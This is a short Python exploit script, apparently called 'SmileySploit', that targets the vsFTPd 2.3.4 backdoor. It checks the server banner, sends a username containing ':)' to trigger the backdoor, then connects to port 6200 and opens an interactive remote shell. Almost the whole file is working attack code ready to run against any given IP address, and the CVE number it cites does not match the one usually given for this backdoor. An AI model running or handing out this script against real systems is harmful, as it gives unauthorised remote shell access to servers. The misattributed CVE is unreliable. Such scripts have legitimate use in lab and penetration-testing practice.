from pwn import *
import sys
import time
from time import sleep


#-------------------------------------------------------
#                      SmileySploit
#-------------------------------------------------------
#A simple exploit for the vsFTPd implemented backdoor
#discovered on 2011, using a smiley emoticon to trigger it.
#                      CVE-2011-4661
#--------------------------------------------------------

class SmileySploit:
  try:

    def __init__(self, ip, port=21):
      self.ip = ip					#What the fuck is wrong????????????
      self.port = port
      self.p = log.progress("")

    def setup(self):
      self.p.status("Hang tight! Verifying Vulnerable Server....")
      io = remote(self.ip, self.port)

      io.recvuntil(
          b"vsFTPd ")  #Get the version by looking for the vsFTPd string
      version = (io.recvuntil(b")")[:-1]
                 ).decode()  #Decode the version number to a usable string form
      if version != "2.3.4":  #If the decoded version is not 2.3.4, then display error and exit
        self.p.failure("Version 2.3.4 was not found and/or is not the version being used.")
        exit()

      else:
        self.p.status("Triggering the backdoor....")
        io.sendline(b"USER testing:)")      #Exploit the server using the smiley face as authentication
        io.sendline(b"PASS testing123")    #It doesn't matter what comes first before the smiley, the emoticon will still trigger the backdoor regardless
        io.close()

    def loading_shell(self):
      self.p.status("Connecting to the created backdoor...")
      sleep(1)      #Just wait a bit so that shit doesn't get missed
      io = remote(self.ip, 6200)  #Connect to the backdoor using the IP address used and the port 6200.
      self.p.success("Got Shell!!!")
      io.interactive()    #Print the interactive shell (WE NOW HAVE REMOTE ACCESS)
      io.close()
      
  except KeyboardInterrupt:
    print("Process was interrupted!")
  

if __name__ == "__main__":
  try:
    if len(sys.argv) < 2 or len(sys.argv) > 3:
      print("")
      
    if len(sys.argv) == 3:
      exploit = SmileySploit(sys.argv[1], sys.argv[2]) #If an IP address and port are provided, use them.
    else:
      exploit = SmileySploit(sys.argv[1])    #If no IP address and port are provided, use the default IP address and port.
   
    exploit.setup()
    exploit.loading_shell()
    
  except IndexError:
    print("SmileySploit Error!!")
    print("Invalid usage!")
    print(f"Usage: {sys.argv[0]} IP PORT (optional)")